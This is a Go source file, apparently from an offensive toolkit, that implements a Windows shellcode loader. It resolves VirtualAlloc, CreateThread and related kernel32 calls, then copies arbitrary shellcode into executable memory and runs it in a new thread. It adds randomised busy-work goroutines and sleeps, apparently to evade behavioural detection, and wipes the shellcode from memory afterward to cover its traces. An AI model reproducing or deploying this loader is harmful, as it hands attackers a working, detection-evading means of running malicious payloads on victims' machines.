// +build windows

package shellcode

import (
	"bytes"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/pkg/errors"

	"project/internal/random"
)

var (
	initLoadDllOnce sync.Once

	rand *random.Rand

	kernel32            *syscall.DLL
	virtualAlloc        *syscall.Proc
	createThread        *syscall.Proc
	waitForSingleObject *syscall.Proc
	virtualFree         *syscall.Proc

	initErr error
)

func doUseless(c chan []byte) {
	buf := bytes.Buffer{}
	rand := random.New(rand.Int64())
	n := 100 + rand.Int(100)
	for i := 0; i < n; i++ {
		buf.Write(random.Bytes(16 + rand.Int(1024)))
		c <- buf.Bytes()
	}
}

func schedule() {
	bChan := make(chan []byte, 1024)
	n := 8 + rand.Int(8)
	for i := 0; i < n; i++ {
		go doUseless(bChan)
	}
	runtime.Gosched()
read:
	for {
		select {
		case b := <-bChan:
			b[0] = byte(rand.Int64())
		case <-time.After(25 * time.Millisecond):
			break read
		}
	}
	time.Sleep(time.Millisecond * time.Duration(50+rand.Int(100)))
}

func initLoadDll() {
	rand = random.New(0)

	schedule()
	kernel32, initErr = syscall.LoadDLL("kernel32.dll")
	if initErr != nil {
		return
	}

	procMap := [4]*struct {
		proc **syscall.Proc
		name string
	}{
		{
			&virtualAlloc,
			"VirtualAlloc",
		},
		{
			&createThread,
			"CreateThread",
		},
		{
			&waitForSingleObject,
			"WaitForSingleObject",
		},
		{
			&virtualFree,
			"VirtualFree",
		},
	}
	for i := 0; i < 4; i++ {
		schedule()
		p, err := kernel32.FindProc(procMap[i].name)
		if err != nil {
			initErr = err
			return
		}
		schedule()
		*procMap[i].proc = p
	}
}

// CreateThread is used to create thread to execute shellcode
// it will block until shellcode exit, so usually need create
// a goroutine to execute CreateThread
func CreateThread(shellcode []byte) error {
	l := len(shellcode)
	if l == 0 {
		return errors.New("no data")
	}

	initLoadDllOnce.Do(initLoadDll)
	if initErr != nil {
		return errors.WithStack(initErr)
	}

	const (
		memCommit            = uintptr(0x1000)
		memReserve           = uintptr(0x2000)
		pageExecuteReadWrite = uintptr(0x40)
		memRelease           = uintptr(0x8000)
	)
	schedule()
	memAddr, _, err := virtualAlloc.Call(0, uintptr(l),
		memReserve|memCommit, pageExecuteReadWrite)
	if memAddr == 0 {
		return errors.WithStack(err)
	}

	// copy shellcode
	rand := random.New(0)
	count := 0
	for i := 0; i < l; i++ {
		if count > 32 {
			schedule()
			count = 0
		} else {
			count += 1
		}
		// set shellcode
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = shellcode[i]

		// clean shellcode
		shellcode[i] = byte(rand.Int64())
	}

	schedule()
	threadAddr, _, err := createThread.Call(0, 0, memAddr, 0, 0, 0)
	if threadAddr == 0 {
		return errors.WithStack(err)
	}

	schedule()
	_, _, _ = waitForSingleObject.Call(threadAddr, 0xFFFFFFFF)

	// cover shellcode and free memory
	schedule()
	rand = random.New(0)
	for i := 0; i < l; i++ {
		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
		*b = byte(rand.Int64())
	}
	_, _, _ = virtualFree.Call(memAddr, 0, memRelease)

	schedule()
	return nil
}
